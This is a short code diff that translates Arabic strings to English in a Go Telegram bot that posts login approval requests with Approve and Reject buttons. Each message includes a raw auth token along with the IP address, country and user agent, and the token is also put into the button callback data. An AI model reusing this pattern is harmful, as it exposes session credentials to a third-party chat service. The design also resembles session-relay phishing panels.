@@ -354,13 +354,13 @@ func (t *TelegramBot) SendLoginApprovalRequest(sessionID string, authToken strin
 
 	// إنشاء نص الرسالة
 	message := fmt.Sprintf(
-		"🔐 <b>طلب تسجيل دخول جديد</b>\n\n"+
-			"🆔 <b>معرف الجلسة:</b> %s\n"+
-			"🔑 <b>توكن المصادقة:</b> %s\n"+
-			"🌍 <b>البلد:</b> %s\n"+
-			"🖥️ <b>عنوان IP:</b> %s\n"+
-			"📱 <b>المتصفح:</b> %s\n\n"+
-			"<b>هل تريد الموافقة على طلب تسجيل الدخول هذا؟</b>",
+		"🔐 <b>New Login Request</b>\n\n"+
+			"🆔 <b>Session ID:</b> %s\n"+
+			"🔑 <b>Auth Token:</b> %s\n"+
+			"🌍 <b>Country:</b> %s\n"+
+			"🖥️ <b>IP Address:</b> %s\n"+
+			"📱 <b>User Agent:</b> %s\n\n"+
+			"<b>Do you want to approve this login request?</b>",
 		sessionID, authToken, country, ipAddress, userAgent,
 	)
 
@@ -368,11 +368,11 @@ func (t *TelegramBot) SendLoginApprovalRequest(sessionID string, authToken strin
 	buttons := [][]InlineKeyboardButton{
 		{
 			{
-				Text:         "✅ موافقة",
+				Text:         "✅ Approve",
 				CallbackData: fmt.Sprintf("approve:%s:%s", sessionID, authToken),
 			},
 			{
-				Text:         "❌ رفض",
+				Text:         "❌ Reject",
 				CallbackData: fmt.Sprintf("reject:%s", sessionID),
 			},
 		},
@@ -430,7 +430,7 @@ func (t *TelegramBot) StartPolling(callback func(string, string)) {
 							// استدعاء الدالة المرجعية مع البيانات
 							go func(action, sessionID, authToken string) {
 								// تأكيد استلام الاستدعاء
-								t.answerCallbackQuery(callbackQuery["id"].(string), fmt.Sprintf("تم تنفيذ: %s", action))
+								t.answerCallbackQuery(callbackQuery["id"].(string), fmt.Sprintf("Action: %s", action))
 								
 								// استدعاء المعالج المسجل
 								callback(action, sessionID)
